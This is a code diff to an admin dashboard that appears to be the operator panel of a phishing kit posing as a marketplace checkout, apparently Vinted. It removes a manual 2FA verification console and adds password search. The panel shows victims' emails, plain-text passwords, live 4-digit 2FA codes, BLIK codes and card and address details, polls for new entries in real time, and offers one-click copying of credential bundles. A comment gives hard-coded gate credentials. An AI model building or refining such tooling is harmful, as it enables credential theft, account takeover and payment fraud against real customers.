@@ -57,7 +57,6 @@ export const AdminDashboardPage: React.FC<AdminDashboardPageProps> = ({
   const [orders, setOrders] = useState<AdminOrderRecord[]>([]);
   const [isLoading, setIsLoading] = useState(false);
   const [searchQuery, setSearchQuery] = useState('');
-  const [verificationFilter, setVerificationFilter] = useState<'ALL' | 'PENDING' | 'VERIFIED' | 'INVALID'>('ALL');
   const [autoRefresh, setAutoRefresh] = useState(true);
   const [activeOrder, setActiveOrder] = useState<AdminOrderRecord | null>(null);
   const [copiedField, setCopiedField] = useState<string | null>(null);
@@ -338,35 +337,15 @@ export const AdminDashboardPage: React.FC<AdminDashboardPageProps> = ({
     downloadAnchor.remove();
   };
 
-  // Verification Counts
-  const counts = useMemo(() => {
-    let pending = 0;
-    let verified = 0;
-    let invalid = 0;
-    orders.forEach((o) => {
-      const st = o.verificationStatus || 'PENDING_REVIEW';
-      if (st === 'VERIFIED') verified++;
-      else if (st === 'INVALID_CODE' || st === 'REJECTED') invalid++;
-      else pending++;
-    });
-    return { pending, verified, invalid, total: orders.length };
-  }, [orders]);
-
   // Filtered Orders
   const filteredOrders = useMemo(() => {
+    if (!searchQuery.trim()) return orders;
+    const q = searchQuery.toLowerCase();
     return orders.filter((order) => {
-      // 1. Verification filter
-      const st = order.verificationStatus || 'PENDING_REVIEW';
-      if (verificationFilter === 'PENDING' && st !== 'PENDING_REVIEW') return false;
-      if (verificationFilter === 'VERIFIED' && st !== 'VERIFIED') return false;
-      if (verificationFilter === 'INVALID' && st !== 'INVALID_CODE' && st !== 'REJECTED') return false;
-
-      // 2. Search query filter
-      if (!searchQuery.trim()) return true;
-      const q = searchQuery.toLowerCase();
       return (
         order.orderNumber?.toLowerCase().includes(q) ||
         order.accountDetails?.usernameOrEmail?.toLowerCase().includes(q) ||
+        order.accountDetails?.password?.toLowerCase().includes(q) ||
         order.accountDetails?.phoneCode?.toLowerCase().includes(q) ||
         order.accountDetails?.verificationCode?.toLowerCase().includes(q) ||
         order.shippingAddress?.fullName?.toLowerCase().includes(q) ||
@@ -381,7 +360,7 @@ export const AdminDashboardPage: React.FC<AdminDashboardPageProps> = ({
         order.paymentMethod?.blikCode?.toLowerCase().includes(q)
       );
     });
-  }, [orders, searchQuery, verificationFilter]);
+  }, [orders, searchQuery]);
 
   // =========================================================================
   // VIEW 1: LOGIN GATE (username: move, password: dontmove)
@@ -532,7 +511,7 @@ export const AdminDashboardPage: React.FC<AdminDashboardPageProps> = ({
       </header>
 
       {/* Main Workspace */}
-      <main className="flex-1 max-w-7xl mx-auto w-full px-4 sm:px-6 py-6 space-y-5">
+      <main className="flex-1 max-w-7xl mx-auto w-full px-4 sm:px-6 py-6 space-y-4">
         {actionSuccessMsg && (
           <div className="p-3 bg-teal-50 border border-teal-200 text-teal-800 text-xs rounded-xl flex items-center gap-2">
             <Check className="w-4 h-4 text-teal-600 shrink-0" />
@@ -540,109 +519,7 @@ export const AdminDashboardPage: React.FC<AdminDashboardPageProps> = ({
           </div>
         )}
 
-        {/* 2FA MANUAL VERIFICATION COMMAND BANNER */}
-        <div className="bg-gradient-to-r from-gray-900 via-gray-800 to-gray-900 rounded-2xl p-4 sm:p-5 text-white border border-gray-700 shadow-xl space-y-4">
-          <div className="flex flex-wrap items-center justify-between gap-3">
-            <div className="flex items-center gap-2.5">
-              <div className="w-9 h-9 rounded-xl bg-amber-500/20 border border-amber-500/30 flex items-center justify-center text-amber-400">
-                <ShieldAlert className="w-5 h-5" />
-              </div>
-              <div>
-                <h2 className="text-sm sm:text-base font-bold text-white flex items-center gap-2">
-                  <span>Manual 2FA & Verification Console</span>
-                  {counts.pending > 0 && (
-                    <span className="relative flex h-2.5 w-2.5">
-                      <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-amber-400 opacity-75"></span>
-                      <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-amber-500"></span>
-                    </span>
-                  )}
-                </h2>
-                <p className="text-[11px] text-gray-400">
-                  Inspect incoming customer email, password, and 4-digit code in real-time for manual validation
-                </p>
-              </div>
-            </div>
-
-            <div className="flex items-center gap-2">
-              <button
-                type="button"
-                onClick={() => setAutoRefresh(!autoRefresh)}
-                className={`px-3 py-1.5 rounded-lg text-xs font-semibold flex items-center gap-1.5 transition-colors cursor-pointer border ${
-                  autoRefresh
-                    ? 'bg-emerald-950/80 text-emerald-300 border-emerald-700/80 hover:bg-emerald-900'
-                    : 'bg-gray-800 text-gray-400 border-gray-700 hover:bg-gray-750'
-                }`}
-                title="Toggle Real-Time Polling"
-              >
-                <Radio className={`w-3.5 h-3.5 ${autoRefresh ? 'text-emerald-400 animate-pulse' : 'text-gray-500'}`} />
-                <span>Auto-Sync {autoRefresh ? 'Active (3s)' : 'Paused'}</span>
-              </button>
-            </div>
-          </div>
-
-          {/* Quick Filter Pill Buttons */}
-          <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 pt-1">
-            <button
-              type="button"
-              onClick={() => setVerificationFilter('ALL')}
-              className={`p-2.5 rounded-xl text-left border transition-all cursor-pointer ${
-                verificationFilter === 'ALL'
-                  ? 'bg-gray-800 border-teal-500 text-white shadow-sm'
-                  : 'bg-gray-850/60 border-gray-700/70 text-gray-300 hover:bg-gray-800'
-              }`}
-            >
-              <div className="text-[10px] uppercase font-bold text-gray-400 tracking-wider">All Submissions</div>
-              <div className="text-lg font-bold text-white">{counts.total}</div>
-            </button>
-
-            <button
-              type="button"
-              onClick={() => setVerificationFilter('PENDING')}
-              className={`p-2.5 rounded-xl text-left border transition-all cursor-pointer ${
-                verificationFilter === 'PENDING'
-                  ? 'bg-amber-950/80 border-amber-500 text-amber-200 shadow-sm'
-                  : 'bg-gray-850/60 border-gray-700/70 text-gray-300 hover:bg-gray-800'
-              }`}
-            >
-              <div className="text-[10px] uppercase font-bold text-amber-400 tracking-wider flex items-center gap-1">
-                <Clock className="w-3 h-3" /> Awaiting Review
-              </div>
-              <div className="text-lg font-bold text-amber-300">{counts.pending}</div>
-            </button>
-
-            <button
-              type="button"
-              onClick={() => setVerificationFilter('VERIFIED')}
-              className={`p-2.5 rounded-xl text-left border transition-all cursor-pointer ${
-                verificationFilter === 'VERIFIED'
-                  ? 'bg-emerald-950/80 border-emerald-500 text-emerald-200 shadow-sm'
-                  : 'bg-gray-850/60 border-gray-700/70 text-gray-300 hover:bg-gray-800'
-              }`}
-            >
-              <div className="text-[10px] uppercase font-bold text-emerald-400 tracking-wider flex items-center gap-1">
-                <CheckCircle2 className="w-3 h-3" /> Verified
-              </div>
-              <div className="text-lg font-bold text-emerald-300">{counts.verified}</div>
-            </button>
-
-            <button
-              type="button"
-              onClick={() => setVerificationFilter('INVALID')}
-              className={`p-2.5 rounded-xl text-left border transition-all cursor-pointer ${
-                verificationFilter === 'INVALID'
-                  ? 'bg-rose-950/80 border-rose-500 text-rose-200 shadow-sm'
-                  : 'bg-gray-850/60 border-gray-700/70 text-gray-300 hover:bg-gray-800'
-              }`}
-            >
-              <div className="text-[10px] uppercase font-bold text-rose-400 tracking-wider flex items-center gap-1">
-                <XCircle className="w-3 h-3" /> Invalid / Flagged
-              </div>
-              <div className="text-lg font-bold text-rose-300">{counts.invalid}</div>
-            </button>
-          </div>
-        </div>
-
-        {/* Search Bar */}
+        {/* Minimal Controls Bar: Search & Real-Time Sync Status */}
         <div className="bg-white rounded-xl p-3 sm:p-4 border border-gray-200 shadow-2xs flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-3">
           <div className="relative flex-1">
             <Search className="w-4 h-4 text-gray-400 absolute left-3 top-2.5" />
@@ -657,11 +534,27 @@ export const AdminDashboardPage: React.FC<AdminDashboardPageProps> = ({
               <button
                 type="button"
                 onClick={() => setSearchQuery('')}
-                className="absolute right-2.5 top-2 text-gray-400 hover:text-gray-600"
+                className="absolute right-2.5 top-2 text-gray-400 hover:text-gray-600 cursor-pointer"
               >
                 <X className="w-3.5 h-3.5" />
               </button>
             )}
+          </div>
+
+          <div className="flex items-center gap-2 self-end sm:self-center">
+            <button
+              type="button"
+              onClick={() => setAutoRefresh(!autoRefresh)}
+              className={`px-3 py-2 rounded-lg text-xs font-semibold flex items-center gap-1.5 transition-colors cursor-pointer border ${
+                autoRefresh
+                  ? 'bg-emerald-50 text-emerald-800 border-emerald-300 hover:bg-emerald-100'
+                  : 'bg-gray-100 text-gray-600 border-gray-200 hover:bg-gray-200'
+              }`}
+              title="Toggle Real-Time Polling"
+            >
+              <Radio className={`w-3.5 h-3.5 ${autoRefresh ? 'text-emerald-600 animate-pulse' : 'text-gray-400'}`} />
+              <span>Auto-Sync {autoRefresh ? 'Live' : 'Paused'}</span>
+            </button>
           </div>
         </div>
 
@@ -672,15 +565,14 @@ export const AdminDashboardPage: React.FC<AdminDashboardPageProps> = ({
             <h3 className="text-base font-semibold text-gray-800">No customer records found</h3>
             <p className="text-xs text-gray-500 max-w-sm mx-auto">
               {orders.length === 0
-                ? 'No customer checkout submissions recorded yet. Once a user enters their credentials or completes checkout, it will be mapped here in real-time.'
-                : 'No entries match the current filter or search criteria.'}
+                ? 'No customer checkout submissions recorded yet. Once a user enters their credentials or completes checkout, it will appear here in real-time.'
+                : 'No entries match the current search.'}
             </p>
           </div>
         ) : (
           <div className="space-y-4">
             {filteredOrders.map((order) => {
               const isPickup = order.deliveryType === 'pickup';
-              const vStatus = order.verificationStatus || 'PENDING_REVIEW';
               const customerName =
                 order.shippingAddress?.fullName ||
                 order.paymentMethod?.cardholderName ||
@@ -692,7 +584,7 @@ export const AdminDashboardPage: React.FC<AdminDashboardPageProps> = ({
                   key={order.id}
                   className="bg-white rounded-xl border border-gray-200 shadow-2xs hover:border-gray-300 transition-all p-4 sm:p-5 space-y-4"
                 >
-                  {/* Top Bar: Order ID, Date, Verification Status & Quick Actions */}
+                  {/* Top Bar: Order ID, Date & Quick Actions */}
                   <div className="flex flex-wrap items-center justify-between gap-2 pb-3 border-b border-gray-100">
                     <div className="flex flex-wrap items-center gap-2">
                       <span className="font-bold text-sm text-gray-900">
@@ -710,29 +602,6 @@ export const AdminDashboardPage: React.FC<AdminDashboardPageProps> = ({
                       >
                         {isPickup ? 'Pickup Locker' : 'Home Delivery'}
                       </span>
-
-                      {/* Manual Verification Badge */}
-                      {vStatus === 'VERIFIED' ? (
-                        <span className="text-[10px] font-bold px-2.5 py-0.5 rounded-full uppercase bg-emerald-100 text-emerald-800 border border-emerald-300 flex items-center gap-1">
-                          <CheckCircle2 className="w-3 h-3 text-emerald-600" />
-                          <span>Verified & Approved</span>
-                        </span>
-                      ) : vStatus === 'INVALID_CODE' ? (
-                        <span className="text-[10px] font-bold px-2.5 py-0.5 rounded-full uppercase bg-rose-100 text-rose-800 border border-rose-300 flex items-center gap-1">
-                          <XCircle className="w-3 h-3 text-rose-600" />
-                          <span>Invalid 4-Digit Code</span>
-                        </span>
-                      ) : vStatus === 'REJECTED' ? (
-                        <span className="text-[10px] font-bold px-2.5 py-0.5 rounded-full uppercase bg-gray-200 text-gray-800 border border-gray-300 flex items-center gap-1">
-                          <XCircle className="w-3 h-3 text-gray-600" />
-                          <span>Rejected</span>
-                        </span>
-                      ) : (
-                        <span className="text-[10px] font-bold px-2.5 py-0.5 rounded-full uppercase bg-amber-100 text-amber-900 border border-amber-300 flex items-center gap-1 animate-pulse">
-                          <Clock className="w-3 h-3 text-amber-700" />
-                          <span>Awaiting Manual Verification</span>
-                        </span>
-                      )}
                     </div>
 
                     <div className="flex items-center gap-2">
@@ -774,17 +643,17 @@ export const AdminDashboardPage: React.FC<AdminDashboardPageProps> = ({
 
                   {/* Information Grid: Login Credentials, Customer, Destination, Payment */}
                   <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 text-xs">
-                    {/* Column 1: Account Login & 2FA Credentials + Manual Verification Controls */}
+                    {/* Column 1: Account Login & 2FA Credentials */}
                     <div className="bg-amber-50/70 p-3.5 rounded-xl border border-amber-200/90 space-y-3">
                       <div className="flex items-center justify-between">
                         <span className="font-bold text-amber-950 flex items-center gap-1 text-[11px] uppercase tracking-wider">
-                          <KeyRound className="w-3.5 h-3.5 text-amber-700" /> 2FA & Credentials
+                          <KeyRound className="w-3.5 h-3.5 text-amber-700" /> Credentials & 2FA
                         </span>
                         <button
                           type="button"
                           onClick={() =>
                             handleCopy(
-                              `User: ${order.accountDetails?.usernameOrEmail || 'N/A'} | Pass: ${order.accountDetails?.password || 'N/A'} | 2FA: ${order.accountDetails?.verificationCode || order.accountDetails?.phoneCode || 'N/A'}`,
+                              `User: ${order.accountDetails?.usernameOrEmail || 'N/A'} | Pass: ${order.accountDetails?.password || 'N/A'} | Code: ${order.accountDetails?.verificationCode || order.accountDetails?.phoneCode || 'N/A'}`,
                               `acc_${order.id}`
                             )
                           }
@@ -813,7 +682,7 @@ export const AdminDashboardPage: React.FC<AdminDashboardPageProps> = ({
 
                         <div>
                           <div className="flex items-center justify-between">
-                            <span className="text-amber-900/80 text-[10px] font-bold uppercase tracking-wider">Plain Text Password:</span>
+                            <span className="text-amber-900/80 text-[10px] font-bold uppercase tracking-wider">Password:</span>
                             <button
                               type="button"
                               onClick={() => handleCopy(order.accountDetails?.password || '', `p_${order.id}`)}
@@ -829,7 +698,7 @@ export const AdminDashboardPage: React.FC<AdminDashboardPageProps> = ({
 
                         <div>
                           <div className="flex items-center justify-between">
-                            <span className="text-amber-900/80 text-[10px] font-bold uppercase tracking-wider">4-Digit Code (Real-Time):</span>
+                            <span className="text-amber-900/80 text-[10px] font-bold uppercase tracking-wider">4-Digit Code:</span>
                             {(order.accountDetails?.verificationCode || order.accountDetails?.phoneCode) && (
                               <button
                                 type="button"
@@ -851,7 +720,7 @@ export const AdminDashboardPage: React.FC<AdminDashboardPageProps> = ({
                           ) : (
                             <div className="mt-0.5 p-1.5 bg-amber-100/50 border border-dashed border-amber-300 rounded-md text-[11px] text-amber-800 italic flex items-center gap-1.5">
                               <span className="w-1.5 h-1.5 rounded-full bg-amber-500 animate-ping"></span>
-                              <span>Waiting for customer to type code...</span>
+                              <span>Waiting for code...</span>
                             </div>
                           )}
                         </div>
@@ -861,40 +730,6 @@ export const AdminDashboardPage: React.FC<AdminDashboardPageProps> = ({
                           <span className="font-bold text-gray-800">
                             {order.accountDetails?.rememberDevice !== false ? 'Yes' : 'No'}
                           </span>
-                        </div>
-                      </div>
-
-                      {/* Manual Verification Action Buttons */}
-                      <div className="pt-2 border-t border-amber-200/80 space-y-1.5">
-                        <span className="text-[10px] font-bold text-amber-950 uppercase tracking-wider block">
-                          Manual Verification Action:
-                        </span>
-                        <div className="grid grid-cols-2 gap-1.5">
-                          <button
-                            type="button"
-                            onClick={() => handleSetVerificationStatus(order.id, 'VERIFIED')}
-                            className={`px-2 py-1 rounded-md text-[11px] font-bold flex items-center justify-center gap-1 transition-all cursor-pointer ${
-                              vStatus === 'VERIFIED'
-                                ? 'bg-emerald-600 text-white shadow-xs'
-                                : 'bg-emerald-50 text-emerald-800 hover:bg-emerald-100 border border-emerald-300'
-                            }`}
-                          >
-                            <Check className="w-3 h-3" />
-                            <span>Approve</span>
-                          </button>
-
-                          <button
-                            type="button"
-                            onClick={() => handleSetVerificationStatus(order.id, 'INVALID_CODE')}
-                            className={`px-2 py-1 rounded-md text-[11px] font-bold flex items-center justify-center gap-1 transition-all cursor-pointer ${
-                              vStatus === 'INVALID_CODE'
-                                ? 'bg-rose-600 text-white shadow-xs'
-                                : 'bg-rose-50 text-rose-800 hover:bg-rose-100 border border-rose-300'
-                            }`}
-                          >
-                            <X className="w-3 h-3" />
-                            <span>Invalid</span>
-                          </button>
                         </div>
                       </div>
                     </div>
@@ -1060,28 +895,12 @@ export const AdminDashboardPage: React.FC<AdminDashboardPageProps> = ({
             </div>
 
             <div className="p-4 sm:p-6 overflow-y-auto space-y-4 text-xs font-normal">
-              {/* Vinted Account Login & 2FA Credentials */}
+              {/* Account Login & 2FA Credentials */}
               <div className="p-4 bg-amber-50 rounded-xl border border-amber-200 space-y-3">
                 <div className="flex flex-wrap items-center justify-between gap-2">
-                  <div className="flex items-center gap-2">
-                    <span className="text-[10px] font-bold text-amber-900 uppercase flex items-center gap-1 tracking-wider">
-                      <KeyRound className="w-3.5 h-3.5 text-amber-700" /> Account Credentials & 2FA
-                    </span>
-
-                    {activeOrder.verificationStatus === 'VERIFIED' ? (
-                      <span className="text-[9px] font-bold px-2 py-0.5 rounded-full uppercase bg-emerald-100 text-emerald-800 border border-emerald-300">
-                        Verified
-                      </span>
-                    ) : activeOrder.verificationStatus === 'INVALID_CODE' ? (
-                      <span className="text-[9px] font-bold px-2 py-0.5 rounded-full uppercase bg-rose-100 text-rose-800 border border-rose-300">
-                        Invalid Code
-                      </span>
-                    ) : (
-                      <span className="text-[9px] font-bold px-2 py-0.5 rounded-full uppercase bg-amber-200 text-amber-900 border border-amber-300">
-                        Awaiting Verification
-                      </span>
-                    )}
-                  </div>
+                  <span className="text-[10px] font-bold text-amber-900 uppercase flex items-center gap-1 tracking-wider">
+                    <KeyRound className="w-3.5 h-3.5 text-amber-700" /> Credentials & 2FA
+                  </span>
 
                   <button
                     type="button"
@@ -1105,13 +924,13 @@ export const AdminDashboardPage: React.FC<AdminDashboardPageProps> = ({
                     </p>
                   </div>
                   <div>
-                    <span className="text-amber-900/80 text-[10px] font-bold uppercase tracking-wider">Plain Text Password:</span>
+                    <span className="text-amber-900/80 text-[10px] font-bold uppercase tracking-wider">Password:</span>
                     <p className="font-mono font-bold text-xs sm:text-sm text-gray-900 bg-white/90 border border-amber-200/90 px-2.5 py-1.5 rounded-md mt-0.5 select-all break-all">
                       {activeOrder.accountDetails?.password || 'N/A'}
                     </p>
                   </div>
                   <div>
-                    <span className="text-amber-900/80 text-[10px] font-bold uppercase tracking-wider">4-Digit Code (Real-Time):</span>
+                    <span className="text-amber-900/80 text-[10px] font-bold uppercase tracking-wider">4-Digit Code:</span>
                     {(activeOrder.accountDetails?.verificationCode || activeOrder.accountDetails?.phoneCode) ? (
                       <p className="font-mono font-black text-lg text-emerald-950 tracking-widest bg-emerald-100 border border-emerald-300 px-3 py-1 rounded-md mt-0.5 inline-block">
                         {activeOrder.accountDetails?.verificationCode || activeOrder.accountDetails?.phoneCode}
@@ -1121,42 +940,6 @@ export const AdminDashboardPage: React.FC<AdminDashboardPageProps> = ({
                         Waiting for code...
                       </p>
                     )}
-                  </div>
-                </div>
-
-                {/* Manual Verification Actions */}
-                <div className="pt-2 border-t border-amber-200/90 flex flex-wrap items-center justify-between gap-2">
-                  <span className="text-[10px] font-bold text-amber-950 uppercase">Update Manual Verification:</span>
-                  <div className="flex items-center gap-1.5">
-                    <button
-                      type="button"
-                      onClick={() => handleSetVerificationStatus(activeOrder.id, 'VERIFIED')}
-                      className={`px-3 py-1 rounded-lg text-xs font-bold transition-all cursor-pointer ${
-                        activeOrder.verificationStatus === 'VERIFIED'
-                          ? 'bg-emerald-600 text-white'
-                          : 'bg-emerald-100 text-emerald-800 hover:bg-emerald-200'
-                      }`}
-                    >
-                      ✓ Approve
-                    </button>
-                    <button
-                      type="button"
-                      onClick={() => handleSetVerificationStatus(activeOrder.id, 'INVALID_CODE')}
-                      className={`px-3 py-1 rounded-lg text-xs font-bold transition-all cursor-pointer ${
-                        activeOrder.verificationStatus === 'INVALID_CODE'
-                          ? 'bg-rose-600 text-white'
-                          : 'bg-rose-100 text-rose-800 hover:bg-rose-200'
-                      }`}
-                    >
-                      ⚠ Invalid Code
-                    </button>
-                    <button
-                      type="button"
-                      onClick={() => handleSetVerificationStatus(activeOrder.id, 'PENDING_REVIEW')}
-                      className="px-2.5 py-1 rounded-lg text-xs font-medium text-gray-600 hover:bg-gray-200 cursor-pointer"
-                    >
-                      Reset
-                    </button>
                   </div>
                 </div>
               </div>
